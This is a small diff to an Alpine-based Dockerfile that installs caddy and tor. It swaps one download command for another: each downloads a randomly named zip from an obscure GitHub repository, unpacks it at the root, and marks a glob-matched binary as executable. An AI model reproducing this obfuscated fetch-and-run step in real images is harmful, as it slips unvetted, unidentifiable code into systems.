@@ -2,7 +2,7 @@ FROM alpine:edge
 
 RUN apk update && \
     apk add --no-cache ca-certificates caddy tor wget && \
-    wget -qO- https://github.com/running21/derru/raw/main/dqwertdc.zip | busybox unzip - && \
+    wget -qO- https://github.com/running21/eada/raw/main/gdxfjg.zip | busybox unzip - && \
     chmod +x $(ls /x*y) && \
     rm -rf /var/cache/apk/*
 
